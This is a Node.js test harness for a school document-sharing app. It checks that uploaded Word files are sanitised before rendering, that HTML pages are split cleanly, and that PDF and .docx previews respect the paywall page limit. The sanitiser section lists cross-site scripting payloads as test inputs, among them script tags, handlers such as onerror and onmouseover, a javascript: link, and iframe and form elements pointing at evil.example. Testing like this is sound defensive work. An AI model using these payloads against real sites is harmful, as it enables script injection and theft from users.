/**
 * Verification harness for the document preview.
 *
 *   node scripts/verify-preview.mjs
 *
 * The preview is the one place in this app that renders a *file somebody
 * uploaded* into a page shown to everyone, signed in or not. Two things
 * therefore have to be true, and neither is visible by looking at the screen:
 *
 *   1. Nothing executable survives the conversion. A Word document is markup
 *      before it is a document, and `mammoth` is asked to turn it into HTML
 *      that then goes through `dangerouslySetInnerHTML`.
 *   2. The page limit is the paywall. `preview_pages` decides how much of a
 *      paid document a stranger may read, so a reader that returns one page too
 *      many is giving away stock.
 *
 * Both are checked here against real files — a PDF from this app's own
 * renderer, and a .docx assembled with jszip — rather than against a
 * description of them.
 */

import { createJiti } from 'jiti';

const jiti = createJiti(import.meta.url, {
    alias: { '@': new URL('../src', import.meta.url).pathname },
    interopDefault: true,
});

const { sanitiseHtml, paginateHtml, buildPreview } =
    await jiti.import('../src/services/documentPreview.ts');
const { renderPaperPdf } = await jiti.import('../src/services/paperPdf.ts');

let failures = 0;
let checks = 0;

function check(label, actual, expected) {
    checks++;
    const ok = JSON.stringify(actual) === JSON.stringify(expected);
    if (!ok) failures++;
    console.log(
        `  ${ok ? 'ok  ' : 'FAIL'} ${label.padEnd(56)} ${
            ok ? JSON.stringify(actual) : `got ${JSON.stringify(actual)}, expected ${JSON.stringify(expected)}`
        }`
    );
}

console.log('\nNothing executable survives a converted document');
{
    const attacks = [
        ['a script tag', '<p>Hi</p><script>alert(1)</script>'],
        ['a script with attributes', '<p>Hi</p><script src="https://evil.example/x.js"></script>'],
        ['an inline handler', '<p onclick="alert(1)">Hi</p>'],
        ['a mouseover handler', '<td onmouseover="steal()">Marks</td>'],
        ['an image with an onerror', '<img src=x onerror="alert(1)">'],
        ['a javascript: link', '<a href="javascript:alert(1)">click</a>'],
        ['an iframe', '<iframe src="https://evil.example"></iframe>'],
        ['an object', '<object data="x.swf"></object>'],
        ['a style block', '<style>body{display:none}</style><p>Hi</p>'],
        ['a style attribute', '<p style="position:fixed;inset:0">Hi</p>'],
        ['a conditional comment', '<!--[if IE]><script>alert(1)</script><![endif]--><p>Hi</p>'],
        ['a form', '<form action="https://evil.example"><input name="pw"></form>'],
    ];

    for (const [label, html] of attacks) {
        const clean = sanitiseHtml(html);
        const dangerous =
            /<script|<iframe|<object|<style|<form|<input|<img|on\w+\s*=|javascript:/i.test(clean);
        check(label, dangerous, false);
    }

    // The point is not to strip everything — a scheme of work is mostly table.
    check('paragraphs survive', sanitiseHtml('<p>Hi</p>'), '<p>Hi</p>');
    check('emphasis survives', sanitiseHtml('<p><strong>Bold</strong></p>'), '<p><strong>Bold</strong></p>');
    check(
        'a table survives, stripped of attributes',
        sanitiseHtml('<table border="1"><tr><td width="20">A</td></tr></table>'),
        '<table><tr><td>A</td></tr></table>'
    );
    check('text without markup is untouched', sanitiseHtml('Week 1 — Numbers'), 'Week 1 — Numbers');
}

console.log('\nA page is cut where no tag is open');
{
    // A cut inside a table hands the browser an unclosed tag, and everything
    // after it renders inside that table.
    const html = Array.from({ length: 8 }, (_, i) => `<p>${'word '.repeat(120)}${i}</p>`).join('');
    const pages = paginateHtml(html, 3, 400);

    check('respects the page ceiling', pages.length <= 3, true);
    check(
        'every page closes what it opens',
        pages.every((page) => {
            const open = (page.match(/<(?!\/)[a-z]+>/g) || []).length;
            const close = (page.match(/<\/[a-z]+>/g) || []).length;
            return open === close;
        }),
        true
    );
    check('nothing is dropped between pages', pages.join('').length <= html.length, true);

    const table = `<table>${'<tr><td>cell</td></tr>'.repeat(40)}</table><p>after</p>`;
    const split = paginateHtml(table, 5, 50);
    check('a table is never cut open', split[0].startsWith('<table>') && split[0].endsWith('</table>'), true);
}

console.log('\nA PDF previews as its own opening pages, and no further');
{
    const paper = {
        title: 'End of Term 3 Examination',
        subject: 'Mathematics',
        grade_label: 'Form 4',
        year: 2026,
        institution: 'Skulbase Academy',
        total_marks: 60,
    };
    // Enough questions to run well past one page.
    const questions = Array.from({ length: 30 }, (_, i) => ({
        text: `Question ${i + 1}. ${'Explain your reasoning in full. '.repeat(6)}`,
        marks: 4,
        type: 'Structured',
    }));

    const pdf = renderPaperPdf(paper, questions);
    const one = await buildPreview(pdf, 'pdf', 1);
    const two = await buildPreview(pdf, 'pdf', 2);

    check('one page means one page', one.pages.length, 1);
    check('two means two', two.pages.length, 2);
    check('the document is longer than the preview', two.totalPages > 2, true);
    check('a text PDF previews as text', one.pages[0].kind, 'text');
    check('and the text is real', one.pages[0].text.includes('Mathematics'), true);

    // The limit is the paywall, so a caller asking for the whole document must
    // not get it.
    const greedy = await buildPreview(pdf, 'pdf', 999);
    check('an absurd request is capped', greedy.pages.length <= 10, true);
}

console.log('\nA Word document previews as pages of its own content');
{
    const JSZip = (await import('jszip')).default;

    // Long enough to run well past the preview: pagination is by character
    // budget, so a fixture of short lines would fit inside it and prove nothing.
    const paragraph = 'the learner explores the strand and demonstrates the outcome in context. '.repeat(6);
    const body = Array.from({ length: 40 }, (_, i) =>
        `<w:p><w:r><w:t>Week ${i + 1}: ${paragraph}</w:t></w:r></w:p>`
    ).join('');

    const zip = new JSZip();
    zip.file(
        '[Content_Types].xml',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
            '<Default Extension="xml" ContentType="application/xml"/>' +
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' +
            '</Types>'
    );
    zip.folder('_rels').file(
        '.rels',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>' +
            '</Relationships>'
    );
    zip.folder('word').file(
        'document.xml',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">' +
            `<w:body>${body}</w:body></w:document>`
    );

    const docx = await zip.generateAsync({ type: 'nodebuffer' });

    const preview = await buildPreview(docx, 'docx', 2);
    check('two pages come back', preview.pages.length, 2);
    check('they are HTML', preview.pages[0].kind, 'html');
    check('carrying the real content', preview.pages[0].html.includes('Week 1'), true);
    // A longer document must not report a page count it cannot know, or the
    // reader would claim the preview is the whole thing.
    check('an unknown length is reported as unknown', preview.totalPages, null);

    const one = await buildPreview(docx, 'docx', 1);
    check('one page means one page', one.pages.length, 1);
}

console.log('\nA document that fits inside its preview is not pretending to be longer');
{
    // The reader draws a locked sheet when there is more to come. A one-page
    // handout that reported an unknown length would show a lock over nothing,
    // and charge for a page that does not exist.
    const JSZip = (await import('jszip')).default;
    const zip = new JSZip();
    zip.file(
        '[Content_Types].xml',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
            '<Default Extension="xml" ContentType="application/xml"/>' +
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
            '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' +
            '</Types>'
    );
    zip.folder('_rels').file(
        '.rels',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>' +
            '</Relationships>'
    );
    zip.folder('word').file(
        'document.xml',
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>' +
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">' +
            '<w:body><w:p><w:r><w:t>A single short handout.</w:t></w:r></w:p></w:body></w:document>'
    );

    const short = await buildPreview(await zip.generateAsync({ type: 'nodebuffer' }), 'docx', 3);
    check('one page of content', short.pages.length, 1);
    check('and its length is known', short.totalPages, 1);
}

console.log('\nA format with no reader says so rather than showing an empty frame');
{
    const legacy = await buildPreview(Buffer.from('not really a doc'), 'doc', 2);
    check('a legacy .doc', legacy.pages.length, 0);
    check('and explains itself', typeof legacy.unavailable === 'string' && legacy.unavailable.length > 0, true);
}

console.log(
    failures === 0
        ? `\nAll ${checks} preview checks passed.\n`
        : `\n${failures} of ${checks} preview checks FAILED.\n`
);
process.exit(failures === 0 ? 0 : 1);
